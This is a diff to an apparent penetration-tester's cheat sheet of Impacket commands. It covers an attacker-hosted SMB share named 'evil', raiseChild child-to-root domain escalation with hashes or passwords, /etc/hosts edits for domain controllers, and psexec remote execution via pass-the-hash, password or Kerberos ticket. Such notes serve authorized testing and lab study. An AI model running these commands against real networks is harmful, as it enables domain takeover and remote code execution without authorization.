@@ -12,13 +12,17 @@ impacket-smbserver -smb2support evil $PWD
 # smbserver (password share on kali)
 impacket-smbserver -smb2support -username evil -password evil evil $PWD
 
-# raiseChild
-impacket-raiseChild -hashes <LMHASH>:<NTHASH> <CHILD_DOMAIN>/<ADMIN_USER>
-impacket-raiseChild -hashes <LMHASH>:<NTHASH> <CHILD_DOMAIN>/<ADMIN_USER>:'<PASS>'
+# raiseChild (edit /etc/hosts)
+sudo vim /etc/hosts
+<CHILD_DC_IP> <CHILD_DC_HOSTNAME>.<CHILD_FQDN> 
+<ROOT_DC_IP> <ROOT_DC_HOSTNAME>.<ROOT_FQDN> <ROOT_FQDN> 
+impacket-raiseChild -hashes <LMHASH>:<NTHASH> <CHILD_DOMAIN>/<CHILD_ADMIN_USER>
+impacket-raiseChild <CHILD_DOMAIN>/<CHILD_ADMIN_USER>:'<PASS>'
 
 # psexec
 impacket-psexec <DOMAIN>/<ADMIN>@<HOSTNAME>.<ETC_HOST_FQDN> -hashes <HASH>
 impacket-psexec <DOMAIN>/<ADMIN>:<PASSWORD>@<HOSTNAME>.<ETC_HOST_FQDN>
+impacket-psexec <DOMAIN>/<ADMIN>:'<PASSWORD>'@<IP>
 
 # psexec via env KRB5CCNAME
 impacket-psexec -k -no-pass <HOSTNAME>.<ETC_HOST_FQDN> -dc-ip <DC_IP>
